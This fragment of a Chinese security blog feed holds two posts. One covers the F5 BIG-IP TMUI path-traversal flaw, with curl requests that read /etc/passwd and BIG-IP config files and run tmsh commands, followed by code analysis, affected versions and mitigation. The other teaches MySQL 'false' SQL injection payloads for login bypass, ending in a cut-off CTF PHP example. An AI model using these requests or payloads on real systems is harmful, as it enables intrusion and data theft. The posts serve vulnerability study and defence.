class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -v -k  &#x27;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&#x27;</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license</span><br><span class="line"></span><br><span class="line">https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/imgRCE.png" alt="img"></p><h3 id="RCE-poc"><a href="#RCE-poc" class="headerlink" title="RCE poc"></a>RCE poc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -k  &#x27;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/imgRCE.png" alt="img"></p><h3 id="复现建议"><a href="#复现建议" class="headerlink" title="复现建议"></a>复现建议</h3><p><a href="https://twitter.com/x4ce/status/1279790599793545216">poc参考</a></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200706132918103.png" alt="image-20200706132918103"></p><p><a href="https://market.aliyun.com/products/57004003/cmjj023101.html?spm=5176.730005.productlist.d_cmjj023101.d1bf3524obXKIo&innerSource=search_f5">部署参考</a></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200706132933931.png" alt="image-20200706132933931"></p><h2 id="0x05-漏洞详情"><a href="#0x05-漏洞详情" class="headerlink" title="0x05 漏洞详情"></a>0x05 漏洞详情</h2><p>在 <code>F5 BIG-IP</code> 产品的流量管理用户页面 (TMUI)&#x2F;配置实用程序的特定页面中存在一处远程代码执行漏洞。</p><p><strong>目前msf已经集成了该漏洞的利用。</strong></p><p>未授权的远程攻击者通过向该页面发送特制的请求包，可以造成任意Java 代码执行。进而控制 <code>F5 BIG-IP</code> 的全部功能，包括但不限于: 执行任意系统命令、开启&#x2F;禁用服务、创建&#x2F;删除服务器端文件等。</p><h3 id="tmshCmd"><a href="#tmshCmd" class="headerlink" title="tmshCmd"></a>tmshCmd</h3><p>在 <code>tmshCmd</code> 的 <code>service</code>方法处理请求的时候，对 <code>command</code> 参数进行处理。 命令需要满足两个条件：</p><ol><li><code>cmd.matches</code> 返回 <code>false</code></li><li><code>isUserAuthorized</code> 返回 <code>false</code></li></ol><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/t01d05eac3e0fd599d7.jpeg" alt="img"></p><p>看下第二个条件，只需要 <code>RawRoleId</code> 不为 <code>0、20、100、510</code> 即可。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/t0196a364235c3aaffd.jpeg" alt="img"></p><p>然后调用 <code>WorkspaceUtils.runTmshCommand(cmd, request);</code> 方法执行命令，限制了执行<code>delete,create,list,modify</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;POST&quot;</span>.equalsIgnoreCase(request.getMethod())) &#123;</span><br><span class="line">            String[] cmdArray = command.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">operation</span> <span class="operator">=</span> cmdArray[<span class="number">0</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">module</span> <span class="operator">=</span> cmdArray[<span class="number">2</span>];</span><br><span class="line">            <span class="keyword">if</span> (!ShellCommandValidator.checkForBadShellCharacters(command) &amp;&amp; (operation.equals(<span class="string">&quot;create&quot;</span>) || operation.equals(<span class="string">&quot;delete&quot;</span>) || operation.equals(<span class="string">&quot;list&quot;</span>) || operation.equals(<span class="string">&quot;modify&quot;</span>)) &amp;&amp; WHITELISTED_TMSH_MODULES.contains(<span class="keyword">module</span>)) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                  String[] args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;command&#125;;</span><br><span class="line">                  <span class="type">Result</span> <span class="variable">result</span> <span class="operator">=</span> Syscall.callElevated(Syscall.TMSH, args);</span><br><span class="line">                  output = result.getOutput();</span><br><span class="line">                  error = result.getError();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (CallException var11) &#123;</span><br><span class="line">                  logger.error(NLSEngine.getString(<span class="string">&quot;ilx.workspace.error.TmshCommandFailed&quot;</span>) + <span class="string">&quot;: &quot;</span> + var11.getMessage());</span><br><span class="line">                  error = var11.getMessage();</span><br><span class="line">               &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               error = NLSEngine.getString(<span class="string">&quot;ilx.workspace.error.RejectedTmshCommand&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fileRead"><a href="#fileRead" class="headerlink" title="fileRead"></a>fileRead</h3><p>在 <code>fileRead</code> 的 <code>service</code>方法处理请求的时候，对 <code>fileName</code> 参数进行处理。 文件读取需要满足两个条件：</p><ol><li><code>isFileWhitelisted</code> 方法返回 <code>false</code></li><li><code>userCanAccessPartition</code> 方法返回 <code>false</code></li></ol><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/t014fd837c9f836ff90.jpeg" alt="img"></p><p>调用 <code>isFileWhitelisted</code> 方法，检测请求的 <code>fileName</code> 是否在白名单里，如果不在，则返回<code>false</code>，不抛出错误。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/t01eb661f03f5253e31.jpeg" alt="img"></p><p>继续调用 <code>userCanAccessPartition</code> 方法，检测 <code>fileName</code> 是否以 <code>/var/sdm/plugin_store/plugins/</code> 开头，不是就返回<code>false</code>。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/t019b0b2cf8d0a0dac3.jpeg" alt="img"></p><p>接着就能调用 <code>WorkspaceUtils.readFile(fileName);</code> 方法，进行文件的读取。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/t012eb9458ea0ce3358.jpeg" alt="img"></p><h2 id="0x06-影响版本"><a href="#0x06-影响版本" class="headerlink" title="0x06 影响版本"></a>0x06 影响版本</h2><ul><li>BIG-IP 15.x: 15.1.0&#x2F;15.0.0</li><li>BIG-IP 14.x: 14.1.0 ~ 14.1.2</li><li>BIG-IP 13.x: 13.1.0 ~ 13.1.3</li><li>BIG-IP 12.x: 12.1.0 ~ 12.1.5</li><li>BIG-IP 11.x: 11.6.1 ~ 11.6.5</li></ul><h2 id="0x07-修复建议"><a href="#0x07-修复建议" class="headerlink" title="0x07 修复建议"></a>0x07 修复建议</h2><h3 id="通用修补建议"><a href="#通用修补建议" class="headerlink" title="通用修补建议"></a>通用修补建议</h3><p>升级到以下版本</p><ul><li>BIG-IP 15.x: 15.1.0.4</li><li>BIG-IP 14.x: 14.1.2.6</li><li>BIG-IP 13.x: 13.1.3.4</li><li>BIG-IP 12.x: 12.1.5.2</li><li>BIG-IP 11.x: 11.6.5.2</li></ul><h3 id="临时修补建议"><a href="#临时修补建议" class="headerlink" title="临时修补建议"></a>临时修补建议</h3><p>官方建议可以通过以下步骤临时缓解影响</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200706133159485.png" alt="image-20200706133159485"></p><ol><li>使用以下命令登录对应系统</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmsh</span><br></pre></td></tr></table></figure><ol start="2"><li>编辑 <code>httpd</code> 组件的配置文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit /sys httpd all-properties</span><br></pre></td></tr></table></figure><ol start="3"><li>文件内容如下</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;</span><br><span class="line">&lt;LocationMatch &quot;.*\.\.;.*&quot;&gt;</span><br><span class="line">Redirect 404 /</span><br><span class="line">&lt;/LocationMatch&gt;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure><ol start="4"><li>按照如下操作保存文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按下 ESC 并依次输入</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure><ol start="5"><li>执行命令刷新配置文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save /sys config</span><br></pre></td></tr></table></figure><ol start="6"><li>重启 httpd 服务</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">restart sys service httpd</span><br></pre></td></tr></table></figure><p>并禁止外部IP对 TMUI 页面的访问</p><h2 id="0x08-参见"><a href="#0x08-参见" class="headerlink" title="0x08 参见"></a>0x08 参见</h2><p><a href="https://support.f5.com/csp/article/K52145254">官方文档</a></p><p><a href="https://cert.360.cn/warning/detail?id=a1768348bde7807647cbc7232edce7df">360CERT</a></p><p><a href="https://twitter.com/x4ce/status/1279790599793545216">Budi Khoirudin@x4ce</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary of SQL Injection</title>
      <link href="/2020/07/03/Comprehensive-SQL-Injection-Summary/"/>
      <url>/2020/07/03/Comprehensive-SQL-Injection-Summary/</url>
      
        <content type="html"><![CDATA[<h2 id="False注入"><a href="#False注入" class="headerlink" title="False注入"></a>False注入</h2><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><ul><li>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</li><li>比较多的是在登录验证的时候影响比较大，</li><li>在where进行限定的时候产生一些比较不可预期的错误</li><li>譬如删除数据的时候如果代码过滤不严，这里利用严重的可以删除整个表。</li><li>当然这里可以通过配合其他的姿势来进行利用</li></ul><h3 id="mysql隐式类型的转换"><a href="#mysql隐式类型的转换" class="headerlink" title="mysql隐式类型的转换"></a>mysql隐式类型的转换</h3><ul><li>如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;&#x3D;&gt;NULL 会返回1。不做类型转换</li><li>两个参数都是字符串，按照字符串比较。不做类型转换</li><li>两个参数都是整数，按照整数比较。不做类型转换</li><li>如果不与数字进行比较，则将十六进制值视为二进制字符串。</li><li>有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳</li><li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</li><li><strong>所有其他情况下，两个参数都会被转换为浮点数再进行比较</strong></li><li>如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</li></ul><h3 id="过滤指定的字符串"><a href="#过滤指定的字符串" class="headerlink" title="过滤指定的字符串"></a>过滤指定的字符串</h3><p>trim函数可以过滤指定的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">完整格式：TRIM([&#123;BOTH | LEADING | TRAILING&#125; [remstr] FROM] str)</span><br><span class="line">mysql&gt; SELECT TRIM(&#x27;  bar   &#x27;);  </span><br><span class="line">            -&gt; &#x27;bar&#x27;  </span><br><span class="line">mysql&gt; SELECT TRIM(LEADING &#x27;x&#x27; FROM &#x27;xxxbarxxx&#x27;);   --删除指定的首字符 x  </span><br><span class="line">            -&gt; &#x27;barxxx&#x27;  </span><br><span class="line">mysql&gt; SELECT TRIM(BOTH &#x27;x&#x27; FROM &#x27;xxxbarxxx&#x27;);      --删除指定的首尾字符 x  </span><br><span class="line">            -&gt; &#x27;bar&#x27;  </span><br><span class="line">mysql&gt; SELECT TRIM(TRAILING &#x27;xyz&#x27; FROM &#x27;barxxyz&#x27;);  --删除指定的尾字符 x  </span><br><span class="line">            -&gt; &#x27;barx&#x27;  </span><br></pre></td></tr></table></figure><h3 id="1-1、算术运算"><a href="#1-1、算术运算" class="headerlink" title="1.1、算术运算"></a>1.1、算术运算</h3><p>加：<code>+</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+&#x27;,</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;+&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>减：<code>-</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-&#x27;</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;-&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>乘：<code>*</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;*&#x27;</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;*&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>除：<code>/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/6#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;/6#</span><br></pre></td></tr></table></figure><p>取余：<code>%</code></p><blockquote><p>%的原理：分子为字符串转化为0,他分母不能为0,分母为0的话结果为NULL,分母不为0的话 结果都为0</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;%1#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;%1#</span><br></pre></td></tr></table></figure><h3 id="1-2、-位操作运算"><a href="#1-2、-位操作运算" class="headerlink" title="1.2、 位操作运算"></a>1.2、 位操作运算</h3><p>我们可以使用当字符串和数字运算的时候类型转换的问题进行利用</p><blockquote><p>如果任一操作数为NULL，则返回NULL。 对于非NULL操作数，如果奇数个操作数非零，则求值为1，否则返回0</p></blockquote><p>我们可以用的位运算符有：</p><p>和运算：<code>&amp;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&amp;0#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;&amp;0#&#x27;</span><br></pre></td></tr></table></figure><p>或运算：<code>|</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;|0#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;|0#&#x27;</span><br></pre></td></tr></table></figure><p>异或运算：<code>^</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;^0#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;^0#&#x27;</span><br></pre></td></tr></table></figure><p>移位操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;&lt;0#</span><br><span class="line">&#x27;&gt;&gt;0#</span><br></pre></td></tr></table></figure><p>位非（~）：这里位非运算符由于是在表达式之前的</p><h3 id="1-3、-比较运算符"><a href="#1-3、-比较运算符" class="headerlink" title="1.3、 比较运算符"></a>1.3、 比较运算符</h3><p>安全等于：<code>&lt;=&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1&lt;=&gt;null -- 结果为0</span><br><span class="line">select null &lt;=&gt; null -- 结果为1</span><br><span class="line">&#x27;=0&lt;=&gt;1#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;=0&lt;=&gt;1#&#x27;</span><br></pre></td></tr></table></figure><p>不等于<code>&lt;&gt;(!=)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=0&lt;&gt;0#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;=0&lt;&gt;0#&#x27;</span><br></pre></td></tr></table></figure><p>大小于<code>&gt;或&lt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;-1#</span><br><span class="line">拼接的语句：where username=&#x27;&#x27;&gt;-1#</span><br></pre></td></tr></table></figure><h3 id="1-4、-其他"><a href="#1-4、-其他" class="headerlink" title="1.4、 其他"></a>1.4、 其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+1 is not null#</span><br><span class="line"></span><br><span class="line">&#x27;in(-1,1)#    (in结果集有null不影响;)</span><br><span class="line"></span><br><span class="line">&#x27;not in(1,0)#   (not in的结果集中出现null则查询结果为null;)</span><br><span class="line"></span><br><span class="line">&#x27;like 1#</span><br><span class="line"></span><br><span class="line">&#x27;REGEXP 1#</span><br><span class="line"></span><br><span class="line">&#x27;BETWEEN 1 AND 1#</span><br><span class="line"></span><br><span class="line">&#x27;div 1#</span><br><span class="line"></span><br><span class="line">&#x27;xor 1#</span><br><span class="line"></span><br><span class="line">&#x27;=round(0,1)=&#x27;1</span><br><span class="line"></span><br><span class="line">&#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-5-综合利用"><a href="#1-5-综合利用" class="headerlink" title="1.5 综合利用"></a>1.5 综合利用</h3><p>有时候如果我们的注入点不能有数字出现，比如过滤了数字，那我们该如何利用？</p><p>这里就可以利用一些内置的函数或运算来构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;aaa&#x27;=&#x27;&#x27;-&#x27;&#x27;;</span><br><span class="line">+-------------+</span><br><span class="line">| &#x27;aaa&#x27;=&#x27;&#x27;-&#x27;&#x27; |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;aaa&#x27;=~~&#x27;&#x27;;</span><br><span class="line">+------------+</span><br><span class="line">| &#x27;aaa&#x27;=~~&#x27;&#x27; |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;aaa&#x27;=mod(pi(),pi());</span><br><span class="line">+----------------------+</span><br><span class="line">| &#x27;aaa&#x27;=mod(pi(),pi()) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这里举例一道题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randStr</span>(<span class="params"><span class="variable">$lenth</span>=<span class="number">32</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$strBase</span> = <span class="string">&quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$lenth</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$strBase</span>,<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$strBase</span>)-<span class="number">1</span>),<span class="number">1</span>);</span><br><span class="line">      <span class="variable">$lenth</span> --;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$install</span>)&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;create table `user` (</span></span><br><span class="line"><span class="string">         `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,</span></span><br><span class="line"><span class="string">         `username` varchar(30) NOT NULL,</span></span><br><span class="line"><span class="string">         `passwd` varchar(32) NOT NULL,</span></span><br><span class="line"><span class="string">         `role` varchar(30) NOT NULL</span></span><br><span class="line"><span class="string">       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">       <span class="variable">$sql</span>  = <span class="string">&quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">randStr</span>()).<span class="string">&quot;&#x27;,&#x27;admin&#x27;)&quot;</span>;</span><br><span class="line">       <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$filter</span> = <span class="string">&quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t input this illegal char!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select role from `user` where username =&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$username</span> is &quot;</span>.<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t have this user!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$username</span>));</span><br><span class="line">    <span class="variable">$passwd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$passwd</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span 